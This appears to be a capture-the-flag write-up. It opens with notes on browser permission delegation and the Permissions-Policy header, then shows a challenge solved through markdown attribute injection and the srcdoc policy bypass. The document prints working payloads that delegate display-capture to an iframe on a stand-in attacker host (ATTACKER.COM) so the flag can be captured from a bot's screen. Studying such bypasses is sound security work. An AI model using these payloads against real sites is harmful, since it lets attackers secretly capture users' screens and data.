Based on the research: https://albertofdr.github.io/web-security-class/browser/browser.permissions

notes on the research: 
- Permission is the key or gateway needed to access and request certain browser features. For instance, if a webpage has 'camera' permission, it can request access to or use the camera if previously granted.
- There is no official or standardized list of all permissions supported by browsers.
- Permissions generally have two key characteristics: whether they are powerful and whether they are policy-controlled.
- Powerful Permission: This requires explicit consent from the user via a popup prompt if access has not been granted previously. Examples include camera, microphone, serial, and usb.
- Policy-controlled Permission: This means the permission can either be delegated or not, and a default allowlist is in place. Examples include camera, geolocation, gamepad, and notifications.
- The Permissions Standard defines the common infrastructure for interacting with browser permissions, focusing on "powerful features" and standardizing an API (navigator.permissions.query) to check their state (granted, prompt, or denied).

*Permission Delegation and Iframes*
- Delegation involves allowing child frames (like iframes) to access permissions granted to the main frame. Delegation modes include Undelegated (e.g., notification), Double-keyed (e.g., storage-access), and Delegated (e.g., camera, which is the default).
- The allow attribute on an iframe tag is used to delegate permissions. For example: `<iframe src='//meet.example.org' allow='camera'></iframe>`.
- If a main frame grants a delegated permission (like camera), an iframe with the appropriate allow attribute can access that permission without re-prompting the user.
- The default allowlist for a policy-controlled permission is often set to self, meaning only the top-level document can access it, preventing iframes from using it unless explicitly delegated. A default allowlist of * would previously allow iframes access without explicit delegation.
- Delegation is not dynamic; changing the allow attribute requires reloading the iframe's context (e.g., using window.location.reload()) for the change to take effect.
- A major misconception is that developers can define a policy that affects nested iframes (Iframe A delegates to Iframe B); however, once a permission is delegated to a context, that context can delegate it further, adhering to the Same-Origin Policy (SOP).

*Permissions-Policy Header*
- The Permissions-Policy Standard (formerly Feature-Policy) defines the Permissions-Policy header and the delegation mechanism using the allow attribute.
- The Permissions-Policy header is a response header that allows developers to opt-out of or restrict the use and delegation of permissions.
- Setting a policy like Permissions-Policy: camera=(), microphone=() will disallow the use of those features in ANY CONTEXT.
- Because the Permissions-Policy header uses a structured header format, syntax errors—such as a misplaced comma (camera=(),) or incorrect use of quotes (camera='none')—can break the browser's parsing and cause the header to be discarded entirely.
- Good practice involves setting up the Permissions-Policy header to disable all types of powerful browser features that are not strictly necessary for the website.

*Security Risks and Vulnerabilities*
- A misleading prompt text can occur: when an iframe requests a powerful permission, the prompt displays the name of the top-level document (the main website), not the iframe's origin.
- Permission Hijacking: HTML injection vulnerabilities can be escalated into permission hijacking attacks, especially if powerful permissions (like camera or microphone) have already been granted.
- An attacker could delegate already-granted permissions to their own page, potentially allowing them to view or listen to users even if the camera/microphone is theoretically muted on the videoconferencing website.
- Developers should be cautious about delegating permissions, as doing so increases the attack surface and the risk of vulnerabilities.
- A discovered specification issue involves a bypass where a permission can be delegated to a third party (using a local-scheme document, such as a data: URI), even when the Permissions-Policy header restricts the permission to self (e.g., camera=self)


## The challenge

- strong defenses against xss,  defenses, including escaping angle brackets and attribute quotes in the markdown output, and a strict Content-Security-Policy (CSP) that blocked XSS and CSS exfiltration.

- The bot uses the flag : `--auto-select-desktop-capture-source=E`. This flag, where 'E' stands for 'Entire screen,' allowed the bot to automatically approve screen sharing without a user prompt. This indicated the solution required using screen sharing (display-capture) to capture the flag from the bot’s dashboard (/professor)

- The site uses Permission policy header that strictly restricted powerful permissions like camera, microphone, and display-capture, to self(The self directive means that the permission or feature is restricted such that only the top-level document (the main page) and same-origin iframes can access or request these permissions.). Since XSS was blocked, the attacker could not place the payload on the top level to take a screenshot, leading to a perceived dead end.

- bypass: https://github.com/w3c/webappsec-permissions-policy/issues/552
    >Headerless documents like about:srcdoc do not produce HTTP requests and therefore lack response headers. They usually inherit headers, in particular security headers like CSP, from their parent document. This does not apply to Permissions-Policy yet.

The attacker needed to inject an HTML structure using the markdown feature that allowed embedded pages via the referPage function:
```javascript
// Make markdown possible for students to be descriptive 
const escapeQuotes = (content) => {
  return content
    .replaceAll(`"`, '&quot;')
    .replaceAll(`'`, '&#39;')
}

const escapeHtml = (content) => {
  return content
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

const createImg = (match, altText, src) =>{
  return `<img alt="${escapeQuotes(altText)}" src="${escapeQuotes(src)}"></img>`
}

const createLink = (match, href, text) =>{
  return `<a href="${escapeQuotes(href)}">${escapeHtml(text)}</a>`
}

const referPage = (match, src) =>{
  return `<iframe src="${escapeQuotes(src)}"></iframe>`
}

const strong = (match, strong) => {
  return `<strong>${escapeHtml(strong)}</strong>`;
}

const markdown = (content) => {
  // Prevent XSS
  content = escapeHtml(content);
  return content
    .replace(/!\[([^]*?)\]\(([^]*?)\)/g, createImg)
    .replace(/&\[([^]*?)\]\(([^]*?)\)/g, referPage)
    .replace(/\[(.*?)\]\(([^]*?)\)/g, createLink)
    .replace(/\*\*(.*?)\*\*/g, strong)
    .replace(/  $/mg, `<br>`);
}


// Get and add complain
const urlParams = new URLSearchParams(window.location.search);
const student = urlParams.get('student');

if (student) {
    document.getElementById('student').textContent = student;
} else {
    document.getElementById('student').textContent = 'No student found in URL.';
}

const complain = urlParams.get('complain');
if (complain) {
    document.getElementById('complain').innerHTML = markdown(complain);
} else {
    document.getElementById('complain').textContent = 'No complaint found in URL.';
}

```
The basic conceptual payload structure required to execute the bypass was:
```
<iframe srcdoc="<iframe src='https://ATTACKER.com' allow='display-capture'></iframe>"></iframe>
```
outer iframe: srcdoc which ignores the Permissions-Policy: display-capture=self restriction.

inner iframe: A cross-origin iframe pointing to the attacker's site (https://ATTACKER.COM).

The allow='display-capture' attribute delegates the screen capture permission to the inner iframe. Since the outer iframe is bypasses the self restriction, the delegation succeeds, and the inner iframe gains access.

Since because of the strong defense against xss,  markdown engine escaped angle brackets (<, >) and restricted direct HTML injection, the attacker had to use HTML attribute injection and HTML entities.

Final payload:
```
&[a[srcdoc=&lt;iframe/src=&apos;https://ATTACKER.COM&apos;/allow=display-capture&gt; ](a)](a)
```
The payload breakdown:

- referPage (to create the outer iframe): This function handles the regex `/&\[([^]*?)\]\(([^]*?)\)/g`
 It takes input structured as `&[content](src)` and outputs an outer iframe tag: `<iframe src="[escaped src]"></iframe>`
 The referPage function takes the structure `&[content](src)` and generates an outer `<iframe>` tag with a src attribute.

 - createLink (intended for hyperlinks): This function handles the regex `/\[(.*?)\]\(([^]*?)\)/g`
The overall payload structure `&[...](...)` was designed to utilize the referPage function to create the initial `<iframe>` element

- The structure of the intended link (using createLink) is typically `[text](href)`. If this is nested inside another markdown component, attributes can be injected.

-  `&[a[...](a)](a)`: The payload uses the referPage structure `&[content](src)`. The attacker is injecting the necessary attributes and values within the content part to modify the resulting iframe tag.

- The essential part of the exploit is the inner HTML that creates the local-scheme document bypass: `<iframe srcdoc="<iframe src='https://ATTACKER.com' allow='display-capture'></iframe>"></iframe>`

To achieve this structure using the constrained injection method, the attacker used:

• `a[srcdoc=... ](a)`: This segment is used to inject the srcdoc attribute and its content into the outer iframe.

• HTML Entities: Because the markdown engine escapes standard angle brackets `(<, >)`, the attacker used HTML entities to insert the raw HTML code for the inner iframe:

    ◦ &lt; for <
    ◦ &gt; for >
    ◦ &apos; for ' (used for quoting attributes in the inner frame).

This process allowed the final payload: `&[a[srcdoc=&lt;iframe/src=&apos;https://ATTACKER.COM&apos;/allow=display-capture&gt; ](a)](a)`